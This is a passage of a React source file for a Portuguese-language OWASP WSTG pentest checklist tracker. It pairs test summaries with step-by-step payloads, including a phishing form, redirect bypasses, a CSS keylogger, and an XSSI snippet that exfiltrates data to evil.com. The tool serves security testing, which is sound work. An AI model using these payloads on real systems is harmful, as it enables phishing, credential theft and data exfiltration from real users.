→ document.write(), innerHTML, eval(), setTimeout(string)
→ jQuery: $(), .html(), .append()
【Burp DOM Invader】
→ Ativar DOM Invader no Burp embedded browser
→ Detecta automaticamente sources → sinks
【Manual】
F12 → Sources → buscar: innerHTML, document.write, eval`,tipo:"🔧 Tool + Manual",tools:"Burp DOM Invader, Browser DevTools, manual"},
{id:"WSTG-CLNT-02",title:"Testing for JavaScript Execution",resumo:"Testar execução de JS arbitrário via javascript: URIs, callbacks JSONP, eval() de user input e prototype pollution que pode levar a XSS ou RCE client-side.",
como:`1. Testar javascript: URIs onde links são aceitos
2. Verificar se eval() é usado com input do user
3. Testar JSONP callbacks: /api/data?callback=alert(1)
4. Prototype pollution: ?__proto__[test]=polluted
   → Verificar: Object.prototype.test no console`,tipo:"📝 Manual + Tool",tools:"Browser DevTools, Burp Suite"},
{id:"WSTG-CLNT-03",title:"Testing for HTML Injection",resumo:"Testar se tags HTML são renderizadas quando input do usuário é refletido. Diferente de XSS, pode não executar JS mas permite phishing, defacement e manipulação visual.",
como:`Em parâmetros refletidos:
<h1>HACKED</h1>
<form action="https://evil.com"><input name="senha" placeholder="Digite sua senha"><input type="submit"></form>
→ Se renderizar HTML = injeção confirmada
→ Pode ser usado para phishing dentro do site legítimo`,tipo:"📝 Manual",tools:"Burp Suite, curl"},
{id:"WSTG-CLNT-04",title:"Testing for Client-side URL Redirect",resumo:"Testar open redirect: se a aplicação redireciona para uma URL controlada pelo atacante. Útil para phishing (vítima confia no domínio original) e bypass de filtros OAuth.",
como:`?redirect=https://evil.com
?next=https://evil.com
?url=https://evil.com
?return=//evil.com
?continue=/\\evil.com
?redirect=javascript:alert(1)
【Bypass de filtros】
//evil.com (sem scheme)
/\\evil.com
///evil.com
https://alvo.com.br@evil.com
https://alvo.com.br.evil.com`,tipo:"📝 Manual",tools:"Burp Suite, curl"},
{id:"WSTG-CLNT-05",title:"Testing for CSS Injection",resumo:"Testar se é possível injetar CSS malicioso para exfiltrar dados (via url() em background), criar keylogger CSS ou manipular a interface visual da aplicação.",
como:`Em parâmetros que controlam estilo:
style=background:url(https://evil.com/log?data=exfiltrated)
→ CSS keylogger: input[value^="a"]{background:url(https://evil.com/log?key=a)}
→ Exfiltração de CSRF token via CSS attribute selectors`,tipo:"📝 Manual",tools:"Burp Suite, manual"},
{id:"WSTG-CLNT-06",title:"Testing for Client-side Resource Manipulation",resumo:"Verificar Subresource Integrity (SRI), dependências de CDNs externas sem verificação e possibilidade de manipular recursos carregados pelo client-side.",
como:`1. Verificar se scripts de CDN têm integrity attribute
   → <script src="cdn.js" integrity="sha384-...">
2. Sem SRI: se CDN for comprometido, JS malicioso é carregado
3. Verificar service workers registrados
4. Testar se é possível manipular importações dinâmicas`,tipo:"📝 Manual",tools:"Browser DevTools"},
{id:"WSTG-CLNT-07",title:"Testing Cross Origin Resource Sharing",resumo:"Testar se CORS está mal configurado — origin refletido, wildcard com credentials, null origin aceito. CORS misconfiguration permite roubo de dados cross-origin.",
como:`【Testar reflected origin】
curl -sI https://alvo.com.br/api -H "Origin: https://evil.com" | grep -i access-control
→ Se Access-Control-Allow-Origin: https://evil.com = VULN!
【Testar null origin】
curl -sI https://alvo.com.br/api -H "Origin: null" | grep -i access-control
→ Se permite null = VULN!
【Testar wildcard + credentials】
→ Se Access-Control-Allow-Origin: * COM Allow-Credentials: true = VULN!
【Ferramenta】
python3 CORScanner.py -u https://alvo.com.br`,tipo:"🔧 Tool + Manual",tools:"curl, CORScanner, Burp Suite"},
{id:"WSTG-CLNT-08",title:"Testing for Cross Site Flashing",resumo:"Testar segurança de objetos Flash/SWF (legacy). Em aplicações modernas geralmente N/A, mas sites antigos podem ainda ter SWF vulneráveis a XSS ou data injection.",
como:`1. Verificar se site usa Flash/SWF
2. Se sim: buscar arquivos .swf expostos
3. Testar FlashVars injection
4. Geralmente N/A para aplicações modernas`,tipo:"📝 Manual",tools:"Browser, manual"},
{id:"WSTG-CLNT-09",title:"Testing for Clickjacking",resumo:"Verificar se a aplicação pode ser carregada em iframe por site malicioso. Atacante coloca botões invisíveis sobre o iframe para fazer vítima clicar em ações sensíveis sem perceber.",
como:`【Verificar headers】
curl -sI https://alvo.com.br | grep -iE "x-frame-options|content-security-policy"
→ Esperado: X-Frame-Options: DENY ou SAMEORIGIN
→ Ou CSP: frame-ancestors 'self'
【PoC HTML】
<html><body>
<h1>Clique para ganhar prêmio!</h1>
<iframe src="https://alvo.com.br/delete-account" style="opacity:0.1;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
<button style="position:absolute;top:50%;left:50%">GANHAR!</button>
</body></html>
→ Se iframe carrega = clickjacking possível`,tipo:"📝 Manual",tools:"curl, HTML PoC, Browser"},
{id:"WSTG-CLNT-10",title:"Testing WebSockets",resumo:"Testar segurança de WebSockets: falta de autenticação, ausência de validação de origin, injection em mensagens WS e Cross-Site WebSocket Hijacking (CSWSH).",
como:`1. No Burp: WebSockets History → ver mensagens
2. Verificar se WS exige autenticação
3. Testar injection em mensagens WS (XSS, SQLi)
4. Verificar Origin validation:
   → Conectar de origin diferente → aceita?
5. CSWSH: criar page em evil.com que abre WS para alvo.com.br`,tipo:"📝 Manual + Tool",tools:"Burp Suite, Browser DevTools, wscat"},
{id:"WSTG-CLNT-11",title:"Testing Web Messaging",resumo:"Verificar se postMessage é usado de forma insegura — sem validação de origin no receptor, com wildcard (*) no targetOrigin, permitindo cross-origin data leak.",
como:`1. F12 → buscar: addEventListener("message"
2. O handler verifica event.origin? Se não = vuln!
3. Buscar: postMessage(data, "*") → wildcard = vuln!
4. Testar enviar postMessage de outra origin:
   <script>window.open('https://alvo.com.br').postMessage('teste','*')</script>`,tipo:"📝 Manual",tools:"Browser DevTools, manual"},
{id:"WSTG-CLNT-12",title:"Testing Browser Storage",resumo:"Verificar se localStorage, sessionStorage e IndexedDB contêm dados sensíveis (tokens, senhas, dados pessoais) que deveriam estar protegidos ou serem limpos no logout.",
como:`F12 → Application tab:
→ Local Storage → dados sensíveis?
→ Session Storage → tokens?
→ IndexedDB → registros sensíveis?
→ Cookies → já coberto em SESS-02
Verificar após logout: dados foram limpos?
→ Se token JWT fica em localStorage sem limpeza = risco`,tipo:"📝 Manual",tools:"Browser DevTools"},
{id:"WSTG-CLNT-13",title:"Testing for Cross Site Script Inclusion",resumo:"Testar XSSI: endpoints JS que retornam dados sensíveis baseados na sessão e podem ser incluídos por sites externos via tag <script>, vazando os dados para o atacante.",
como:`1. Identificar endpoints que retornam JS dinâmico com dados do user
2. Verificar JSONP endpoints: /api/user?callback=func
3. Testar inclusão cross-origin:
   <script src="https://alvo.com.br/api/user?callback=stolen"></script>
   function stolen(data) { fetch('https://evil.com/log?d='+JSON.stringify(data)); }
4. Verificar se endpoint requer autenticação para cada request`,tipo:"📝 Manual",tools:"Browser DevTools, Burp Suite"},
]},
{id:"APIT",name:"API Testing",icon:"🔌",color:"#ff8a65",tests:[
{id:"WSTG-APIT-01",title:"Testing GraphQL",resumo:"Testar segurança de APIs GraphQL: introspection habilitado (expõe todo o schema), falta de depth limiting (DoS), batch queries, IDOR e injection em queries/mutations.",
como:`【Introspection query】
POST /graphql
{"query":"{__schema{types{name fields{name type{name}}}}}"}
→ Se retornar schema completo = introspection habilitado (info leak)
【GraphQL Voyager】
→ Visualizar schema como grafo interativo
【Depth/complexity DoS】
{"query":"{user{friends{friends{friends{friends{name}}}}}}"}
→ Se não tiver limit = DoS potencial
【Batch queries】
[{"query":"{ user(id:1){name} }"},{"query":"{ user(id:2){name} }"},...até 1000]
→ Sem rate limit = bruteforce
【Injection】
{"query":"{ user(name:\"' OR 1=1--\"){id} }"}
【InQL (Burp extension)】
→ Instalar InQL → aponta pra /graphql → extrai schema e gera queries`,tipo:"🔧 Tool + Manual",tools:"Burp Suite + InQL, GraphQL Voyager, Altair, curl"},
]},
];
const STORAGE_KEY = "wstg-tracker-v2";
const load = async () => { try { const d = localStorage.getItem(STORAGE_KEY); return d ? JSON.parse(d) : null; } catch { return null; } };
const save = async (d) => { try { localStorage.setItem(STORAGE_KEY, JSON.stringify(d)); } catch(e) { console.error("Save error:", e); } };

export default function App() {
  const [projects, setProjects] = useState([]);
  const [ap, setAp] = useState(null);
  const [showNew, setShowNew] = useState(false);
  const [pName, setPName] = useState("");
  const [pTarget, setPTarget] = useState("");
  const [expCat, setExpCat] = useState(null);
  const [expTest, setExpTest] = useState(null);
  const [filter, setFilter] = useState("all");
  const [search, setSearch] = useState("");
  const [ready, setReady] = useState(false);
  const [sidebar, setSidebar] = useState(true);
  const [delConfirm, setDelConfirm] = useState(null);
  useEffect(() => { load().then(d => { if (d) { setProjects(d.p || []); if (d.a) { const f = (d.p||[]).find(x=>x.id===d.a); if(f)setAp(f); } } setReady(true); }); }, []);
  const persist = (p, aId) => { save({ p, a: aId }); };
  const createProject = () => { if(!pName.trim())return; const n={id:Date.now()+"",name:pName.trim(),target:pTarget.trim(),ts:new Date().toISOString(),checks:{},notes:{}}; const u=[...projects,n]; setProjects(u); setAp(n); persist(u,n.id); setPName(""); setPTarget(""); setShowNew(false); };
  const delProject = id => { const u=projects.filter(p=>p.id!==id); setProjects(u); if(ap?.id===id)setAp(u[0]||null); persist(u,u[0]?.id||null); setDelConfirm(null); };
  const setStatus = (tid,s) => { if(!ap)return; const u=projects.map(p=>{ if(p.id!==ap.id)return p; const c={...p.checks}; s==="none"?delete c[tid]:c[tid]=s; return{...p,checks:c}; }); setProjects(u); const f=u.find(p=>p.id===ap.id); setAp(f); persist(u,f.id); };
  const setNote = (tid,n) => { if(!ap)return; const u=projects.map(p=>{ if(p.id!==ap.id)return p; return{...p,notes:{...p.notes,[tid]:n}}; }); setProjects(u); const f=u.find(p=>p.id===ap.id); setAp(f); persist(u,f.id); };
  const allTests = DB.flatMap(c=>c.tests);
  const total = allTests.length;
  const done = ap ? allTests.filter(t=>ap.checks[t.id]==="done").length : 0;
  const partial = ap ? allTests.filter(t=>ap.checks[t.id]==="partial").length : 0;
  const na = ap ? allTests.filter(t=>ap.checks[t.id]==="na").length : 0;
  const pct = total ? Math.round(((done+na)/total)*100) : 0;
  const catStats = c => { const t=c.tests.length; if(!ap)return{t,d:0,pct:0}; const d=c.tests.filter(x=>ap.checks[x.id]==="done").length; const n=c.tests.filter(x=>ap.checks[x.id]==="na").length; return{t,d,n,pct:t?Math.round(((d+n)/t)*100):0}; };
  const filtered = tests => tests.filter(t => {
    const s = ap?.checks[t.id]||"none";
    if(filter==="done"&&s!=="done")return false;
    if(filter==="partial"&&s!=="partial")return false;
    if(filter==="pending"&&(s==="done"||s==="na"))return false;
    if(filter==="na"&&s!=="na")return false;
    if(search){ const q=search.toLowerCase(); return t.id.toLowerCase().includes(q)||t.title.toLowerCase().includes(q)||t.resumo.toLowerCase().includes(q); }
    return true;
  });
  if(!ready) return <div style={{display:"flex",alignItems:"center",justifyContent:"center",height:"100vh",background:"#06060c",fontFamily:"monospace"}}><div style={{textAlign:"center"}}><div style={{fontSize:48,fontWeight:900,color:"#00ff88",letterSpacing:8}}>WSTG</div><div style={{color:"#333",marginTop:12,letterSpacing:3,fontSize:11}}>CARREGANDO...</div></div></div>;
  const S = (tag, props) => {
    const styles = {
      app: {display:"flex",minHeight:"100vh",background:"#06060c",fontFamily:"'Segoe UI',system-ui,sans-serif",color:"#d0d0dc",position:"relative"},
      side: {width:sidebar?272:0,minWidth:sidebar?272:0,background:"#09090f",borderRight:"1px solid #14141e",display:"flex",flexDirection:"column",transition:"all .3s",overflow:"hidden"},
      main: {flex:1,overflow:"auto",padding:sidebar?"24px 28px":"24px 28px 24px 44px",maxHeight:"100vh"},
    };
    return styles[tag];
  };
  return (
    <div style={S("app")}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=DM+Sans:wght@400;500;600;700&display=swap');
        *{box-sizing:border-box;margin:0;padding:0}body{background:#06060c}
        ::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:#09090f}::-webkit-scrollbar-thumb{background:#1a1a28;border-radius:3px}::-webkit-scrollbar-thumb:hover{background:#00ff88}
        @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
        @keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
        input:focus,textarea:focus,select:focus{outline:none;border-color:#00ff88!important;box-shadow:0 0 0 2px #00ff8811}
        .test-item:hover{background:#0c0c14!important}
        .cat-head:hover{background:#0c0c14!important}
        .filter-btn{transition:all .15s}
        .filter-btn:hover{border-color:#00ff88!important;color:#00ff88!important}
      `}</style>
      {/* ═══ SIDEBAR ═══ */}
      <div style={S("side")}>
        <div style={{padding:"20px 16px",borderBottom:"1px solid #14141e"}}>
          <div style={{display:"flex",alignItems:"center",gap:10}}>
            <div style={{width:36,height:36,borderRadius:10,background:"linear-gradient(135deg,#00ff88,#00cc6a)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:18,fontWeight:900,color:"#06060c"}}>W</div>
            <div><div style={{fontSize:15,fontWeight:700,color:"#00ff88",fontFamily:"'IBM Plex Mono',monospace",letterSpacing:2}}>WSTG TRACKER</div>
            <div style={{fontSize:9,color:"#444",letterSpacing:2,textTransform:"uppercase",marginTop:1}}>Pentest Checklist v4.2</div></div>
          </div>
        </div>
        <button onClick={()=>setShowNew(true)} style={{margin:"12px 14px",padding:"10px 14px",background:"transparent",border:"1px dashed #00ff8844",borderRadius:8,color:"#00ff88",fontFamily:"'DM Sans',sans-serif",fontSize:13,fontWeight:500,cursor:"pointer",display:"flex",alignItems:"center",gap:8,transition:"all .2s"}}>
          <span style={{fontSize:18,lineHeight:1}}>+</span> Novo Projeto
        </button>
        {showNew && <div style={{padding:"0 14px 12px",display:"flex",flexDirection:"column",gap:8,animation:"fadeIn .2s"}}>
          <input style={{padding:"8px 12px",background:"#0c0c14",border:"1px solid #1a1a28",borderRadius:6,color:"#e0e0e8",fontFamily:"inherit",fontSize:13}} placeholder="Nome do projeto" value={pName} onChange={e=>setPName(e.target.value)} onKeyDown={e=>e.key==="Enter"&&createProject()} autoFocus/>
          <input style={{padding:"8px 12px",background:"#0c0c14",border:"1px solid #1a1a28",borderRadius:6,color:"#e0e0e8",fontFamily:"inherit",fontSize:13}} placeholder="Target (ex: alvo.com.br)" value={pTarget} onChange={e=>setPTarget(e.target.value)} onKeyDown={e=>e.key==="Enter"&&createProject()}/>
          <div style={{display:"flex",gap:6}}>
            <button onClick={createProject} style={{flex:1,padding:"8px",background:"#00ff88",border:"none",borderRadius:6,color:"#06060c",fontWeight:600,fontSize:13,cursor:"pointer"}}>Criar</button>
            <button onClick={()=>setShowNew(false)} style={{flex:1,padding:"8px",background:"transparent",border:"1px solid #1a1a28",borderRadius:6,color:"#666",fontSize:13,cursor:"pointer"}}>Cancelar</button>
          </div>
        </div>}
        <div style={{flex:1,overflow:"auto",padding:"4px 10px"}}>
          {projects.map(p => {
            const active = ap?.id===p.id;
            return <div key={p.id} onClick={()=>{setAp(p);setExpCat(null);setExpTest(null);}} style={{padding:"10px 12px",borderRadius:8,cursor:"pointer",marginBottom:3,border:active?"1px solid #00ff8833":"1px solid transparent",background:active?"#00ff8808":"transparent",position:"relative",transition:"all .15s"}}>
              <div style={{fontSize:13,fontWeight:active?600:400,color:active?"#fff":"#aaa"}}>{p.name}</div>
              <div style={{fontSize:10,color:"#444",fontFamily:"'IBM Plex Mono',monospace",marginTop:2}}>{p.target||"—"}</div>
              {delConfirm===p.id ?
                <div style={{position:"absolute",right:6,top:6,display:"flex",gap:4}}>
                  <button onClick={e=>{e.stopPropagation();delProject(p.id);}} style={{padding:"2px 8px",background:"#ff4444",border:"none",borderRadius:4,color:"#fff",fontSize:10,cursor:"pointer"}}>Sim</button>
                  <button onClick={e=>{e.stopPropagation();setDelConfirm(null);}} style={{padding:"2px 8px",background:"#222",border:"none",borderRadius:4,color:"#888",fontSize:10,cursor:"pointer"}}>Não</button>
                </div> :
                <button onClick={e=>{e.stopPropagation();setDelConfirm(p.id);}} style={{position:"absolute",right:8,top:8,background:"none",border:"none",color:"#333",fontSize:14,cursor:"pointer",padding:"2px 5px"}}>×</button>
              }
            </div>;
          })}
        </div>
        <div style={{padding:"12px 16px",borderTop:"1px solid #14141e",textAlign:"center"}}>
          <div style={{fontSize:9,color:"#282830",letterSpacing:1}}>OWASP WSTG v4.2 • {total} TESTES</div>
          <div style={{fontSize:9,color:"#282830",letterSpacing:1}}>RDJ Technology</div>
        </div>
      </div>
      {/* Toggle */}
      <button onClick={()=>setSidebar(!sidebar)} style={{position:"fixed",bottom:12,left:sidebar?276:4,zIndex:20,background:"#14141e",border:"1px solid #1a1a28",color:"#00ff88",width:24,height:24,borderRadius:6,cursor:"pointer",fontSize:9,display:"flex",alignItems:"center",justifyContent:"center",transition:"left .3s"}}>{sidebar?"◀":"▶"}</button>
      {/* ═══ MAIN ═══ */}
      <div style={S("main")}>
        {!ap ? (
          <div style={{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",height:"80vh",textAlign:"center"}}>
            <div style={{fontSize:56,marginBottom:16}}>🛡️</div>
            <div style={{fontSize:26,fontWeight:700,color:"#00ff88",fontFamily:"'IBM Plex Mono',monospace",letterSpacing:3}}>OWASP WSTG</div>
            <div style={{fontSize:13,color:"#444",maxWidth:420,lineHeight:1.7,margin:"12px 0 28px"}}>Checklist completo do Web Security Testing Guide com {total} testes, resumos em PT-BR, comandos reais e passo a passo para cada validação. Crie um projeto para começar.</div>
            <button onClick={()=>{setSidebar(true);setShowNew(true);}} style={{padding:"12px 28px",background:"#00ff88",border:"none",borderRadius:8,color:"#06060c",fontSize:14,fontWeight:600,cursor:"pointer"}}>+ Criar Projeto</button>
          </div>
        ) : (<>
          {/* Header */}
          <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start",marginBottom:16,flexWrap:"wrap",gap:14}}>
            <div>
              <h1 style={{fontSize:22,fontWeight:700,color:"#fff",fontFamily:"'IBM Plex Mono',monospace",margin:0}}>{ap.name}</h1>
              {ap.target && <div style={{fontSize:12,color:"#00ff88",fontFamily:"'IBM Plex Mono',monospace",marginTop:3}}>{ap.target}</div>}
            </div>
            <div style={{display:"flex",gap:20}}>
              {[["Total",total,"#888"],["Feitos",done,"#00ff88"],["Parcial",partial,"#ffaa00"],["N/A",na,"#555"]].map(([l,v,c])=>
                <div key={l} style={{textAlign:"center"}}><div style={{fontSize:22,fontWeight:700,fontFamily:"'IBM Plex Mono',monospace",color:c}}>{v}</div><div style={{fontSize:9,color:"#444",letterSpacing:1,textTransform:"uppercase",marginTop:1}}>{l}</div></div>
              )}
            </div>
          </div>
          {/* Progress */}
          <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:18}}>
            <div style={{flex:1,height:5,background:"#14141e",borderRadius:3,overflow:"hidden"}}>
              <div style={{height:"100%",width:`${pct}%`,background:"linear-gradient(90deg,#00ff88,#00cc6a)",borderRadius:3,transition:"width .4s"}}/>
            </div>
            <span style={{fontSize:13,fontWeight:700,color:"#00ff88",fontFamily:"'IBM Plex Mono',monospace",minWidth:36,textAlign:"right"}}>{pct}%</span>
          </div>
          {/* Filters */}
          <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:18,flexWrap:"wrap",gap:10}}>
            <div style={{display:"flex",gap:5}}>
              {[["all","Todos"],["pending","Pendentes"],["partial","Parcial"],["done","Feitos"],["na","N/A"]].map(([v,l])=>
                <button key={v} className="filter-btn" onClick={()=>setFilter(v)} style={{padding:"5px 13px",background:filter===v?"#00ff8815":"#0c0c14",border:`1px solid ${filter===v?"#00ff8844":"#14141e"}`,borderRadius:6,color:filter===v?"#00ff88":"#666",fontSize:11,cursor:"pointer",fontFamily:"inherit"}}>{l}</button>
              )}
            </div>
            <input style={{padding:"7px 12px",background:"#0c0c14",border:"1px solid #14141e",borderRadius:7,color:"#d0d0dc",fontSize:12,width:220,fontFamily:"inherit"}} placeholder="🔍 Buscar teste..." value={search} onChange={e=>setSearch(e.target.value)}/>
          </div>
          {/* Categories */}
          <div style={{display:"flex",flexDirection:"column",gap:6,paddingBottom:40}}>
            {DB.map(cat => {
              const cs = catStats(cat);
              const isExp = expCat===cat.id;
              const tests = filtered(cat.tests);
              if(filter!=="all"&&tests.length===0)return null;
              return <div key={cat.id} style={{background:"#09090f",border:"1px solid #14141e",borderRadius:10,overflow:"hidden",animation:"fadeIn .25s"}}>
                <div className="cat-head" onClick={()=>setExpCat(isExp?null:cat.id)} style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"12px 16px",cursor:"pointer",transition:"background .15s"}}>
                  <div style={{display:"flex",alignItems:"center",gap:10}}>
                    <span style={{fontSize:20}}>{cat.icon}</span>
                    <div>
                      <div style={{fontSize:13,fontWeight:600,color:"#e0e0e8"}}>{cat.name}</div>
                      <div style={{fontSize:10,color:"#444"}}>{cat.tests.length} testes</div>
                    </div>
                  </div>
                  <div style={{display:"flex",alignItems:"center",gap:10}}>
                    <div style={{width:70,height:3,background:"#14141e",borderRadius:2,overflow:"hidden"}}>
                      <div style={{height:"100%",width:`${cs.pct}%`,background:cat.color,borderRadius:2,transition:"width .3s"}}/>
                    </div>
                    <span style={{fontSize:11,fontWeight:600,color:cat.color,fontFamily:"'IBM Plex Mono',monospace",minWidth:28}}>{cs.pct}%</span>
                    <span style={{fontSize:9,color:"#444",transition:"transform .2s",transform:isExp?"rotate(90deg)":"rotate(0)"}}>▶</span>
                  </div>
                </div>
                {isExp && <div style={{borderTop:"1px solid #14141e"}}>
                  {tests.map(test => {
                    const status = ap.checks[test.id]||"none";
                    const isOpen = expTest===test.id;
                    const note = ap.notes[test.id]||"";
                    const statusColors = {done:"#00ff88",partial:"#ffaa00",na:"#555",none:"transparent"};
                    return <div key={test.id} className="test-item" style={{borderBottom:"1px solid #0a0a12",transition:"background .15s",animation:"fadeIn .2s"}}>
                      {/* Test header */}
                      <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"10px 16px",gap:10}}>
                        <div style={{display:"flex",alignItems:"flex-start",gap:10,flex:1,cursor:"pointer"}} onClick={()=>setExpTest(isOpen?null:test.id)}>
                          <div style={{width:22,height:22,minWidth:22,borderRadius:5,border:`2px solid ${statusColors[status]||"#1a1a28"}`,background:status==="done"?"#00ff88":status==="partial"?"#ffaa0022":status==="na"?"#33333344":"transparent",display:"flex",alignItems:"center",justifyContent:"center",fontSize:12,fontWeight:700,color:status==="done"?"#06060c":status==="partial"?"#ffaa00":"#555",marginTop:2,transition:"all .15s"}}>
                            {status==="done"?"✓":status==="partial"?"◐":status==="na"?"—":""}
                          </div>
                          <div style={{flex:1}}>
                            <div style={{display:"flex",alignItems:"center",gap:8,flexWrap:"wrap"}}>
                              <span style={{fontSize:9,color:cat.color+"99",fontFamily:"'IBM Plex Mono',monospace",letterSpacing:.5,fontWeight:600}}>{test.id}</span>
                              <span style={{fontSize:9,color:"#333",fontFamily:"'IBM Plex Mono',monospace"}}>{test.tipo}</span>
                            </div>
                            <div style={{fontSize:12.5,fontWeight:500,marginTop:2,color:status==="done"?"#666":"#d0d0dc",textDecoration:status==="done"?"line-through":"none",lineHeight:1.3}}>{test.title}</div>
                          </div>
                        </div>
                        <div style={{display:"flex",alignItems:"center",gap:6}}>
                          <select value={status} onChange={e=>setStatus(test.id,e.target.value)} style={{padding:"3px 6px",background:"#0c0c14",border:"1px solid #14141e",borderRadius:5,color:"#888",fontSize:10,cursor:"pointer",fontFamily:"inherit"}}>
                            <option value="none">⬜ Pendente</option>
                            <option value="partial">🟡 Parcial</option>
                            <option value="done">✅ Feito</option>
                            <option value="na">⬛ N/A</option>
                          </select>
                          <button onClick={()=>setExpTest(isOpen?null:test.id)} style={{background:"none",border:"1px solid #14141e",color:isOpen?"#00ff88":"#444",width:24,height:24,borderRadius:5,cursor:"pointer",fontSize:9,display:"flex",alignItems:"center",justifyContent:"center",transition:"all .15s"}}>{isOpen?"▲":"▼"}</button>
                        </div>
                      </div>
                      {/* Test details */}
                      {isOpen && <div style={{padding:"0 16px 16px 48px",animation:"fadeIn .2s ease"}}>
                        {/* Resumo */}
                        <div style={{background:"#0c0c14",border:"1px solid #14141e",borderRadius:8,padding:"12px 14px",marginBottom:12}}>
                          <div style={{fontSize:10,fontWeight:600,color:cat.color,textTransform:"uppercase",letterSpacing:1.5,marginBottom:6,fontFamily:"'IBM Plex Mono',monospace"}}>📖 O que é este teste</div>
                          <div style={{fontSize:12,color:"#aaa",lineHeight:1.7}}>{test.resumo}</div>
                        </div>
                        {/* Como validar */}
                        <div style={{background:"#0c0c14",border:"1px solid #14141e",borderRadius:8,padding:"12px 14px",marginBottom:12}}>
                          <div style={{fontSize:10,fontWeight:600,color:"#00ff88",textTransform:"uppercase",letterSpacing:1.5,marginBottom:6,fontFamily:"'IBM Plex Mono',monospace"}}>🎯 Como executar / validar</div>
                          <pre style={{fontSize:11,color:"#c8c8d0",lineHeight:1.75,whiteSpace:"pre-wrap",wordBreak:"break-word",fontFamily:"'IBM Plex Mono',monospace",margin:0}}>{test.como}</pre>
                        </div>
                        {/* Tools */}
                        <div style={{marginBottom:12}}>
                          <div style={{fontSize:10,fontWeight:600,color:"#888",textTransform:"uppercase",letterSpacing:1.5,marginBottom:6,fontFamily:"'IBM Plex Mono',monospace"}}>🔧 Ferramentas</div>
                          <div style={{display:"flex",flexWrap:"wrap",gap:5}}>
                            {test.tools.split(", ").map((t,i)=><span key={i} style={{padding:"3px 9px",background:cat.color+"11",border:`1px solid ${cat.color}33`,borderRadius:10,fontSize:10,color:cat.color,fontFamily:"'IBM Plex Mono',monospace"}}>{t}</span>)}
                          </div>
                        </div>
                        {/* Notes */}
                        <div>
                          <div style={{fontSize:10,fontWeight:600,color:"#888",textTransform:"uppercase",letterSpacing:1.5,marginBottom:6,fontFamily:"'IBM Plex Mono',monospace"}}>📝 Suas notas / findings</div>
                          <textarea style={{width:"100%",background:"#080810",border:"1px solid #14141e",borderRadius:7,padding:"10px 12px",fontFamily:"'IBM Plex Mono',monospace",fontSize:11,color:"#bbb",resize:"vertical",lineHeight:1.6,minHeight:60}} placeholder="Anote findings, evidências, screenshots..." value={note} onChange={e=>setNote(test.id,e.target.value)} rows={3}/>
                        </div>
                      </div>}
                    </div>;
                  })}
                  {tests.length===0 && <div style={{padding:16,textAlign:"center",color:"#222",fontSize:12}}>Nenhum teste com este filtro</div>}
                </div>}
              </div>;
            })}
          </div>
        </>)}
      </div>
    </div>
  );
}
